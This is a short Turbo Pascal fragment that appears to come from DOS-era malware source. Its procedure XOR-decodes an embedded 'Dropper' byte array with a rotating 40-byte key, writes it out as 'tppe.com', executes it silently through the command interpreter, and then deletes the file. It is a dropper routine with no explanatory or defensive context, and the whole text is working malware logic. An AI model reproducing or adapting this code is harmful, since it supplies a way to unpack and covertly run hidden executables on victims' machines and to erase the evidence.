   procedure TPPE_1;
   var d:file;
       i,j:integer;
   begin
   j:=1;
   for i:=1 to ComLen do
     begin
     Dropper[i]:=dr[i] xor OldKey[j];
     if j=40 then j:=1 else {$IFOPT T+}inc(j);{$ELSE}j:=j+1;{$ENDIF}
     end;
   assign(d,'tppe.com');rewrite(d,ComLen);
   blockwrite(d,Dropper,1);
   close(d);
   exec(Command,'/c tppe.com>nul');
   erase(d);
   end;
